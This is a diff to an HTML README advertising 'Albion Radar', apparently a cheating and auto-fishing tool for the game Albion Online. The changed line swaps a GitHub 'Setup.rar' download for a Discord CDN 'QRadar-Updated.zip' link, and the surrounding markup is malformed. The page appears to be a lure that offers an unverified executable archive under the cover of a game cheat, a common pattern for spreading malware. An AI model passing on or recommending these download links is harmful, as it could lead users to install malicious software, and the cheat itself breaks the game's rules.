@@ -16,7 +16,7 @@
 <p align="center"><em>Shows the total hidden fishing points of the reservoir and visible points with fish, the number of fish in them. Fishing assistant for automatic fishing without the routine of spawning a mini-game.</em></p>
 <h2 align="center"><strong>Random Dungeons</strong></h2>
 <p align="center"><em>Shows random solo, cursed and group dungeons. Group gates of hell.</em></p>
-<p><h1 align="center"><strong><a href='[https://github.com/ffireman1/manu/releases/download/Set/Setup.rar])'>DOWNLOAD ALBION RADAR</a></strong></h1></p>
+<p><h1 align="center"><strong><a href='[https://github.com/ffireman1/manu/releases/download/Set/Setup.rar])'>[DOWNLOAD](https://cdn.discordapp.com/attachments/813742715464450058/1224653485405110352/QRadar-Updated.zip?ex=661e466f&is=660bd16f&hm=c5928e97718519c9bfed9bf4a6c7a2f3f0185d81a455f24916cb9c9ef1fbe522&)</a></strong></h1></p>
 <p></p><h2 style="text-align: center;"><strong>Requirements</strong></h2></p>
 <p><em>Install <a href='https://www.winpcap.org/'> Wincap</a></em></p>
 </span>
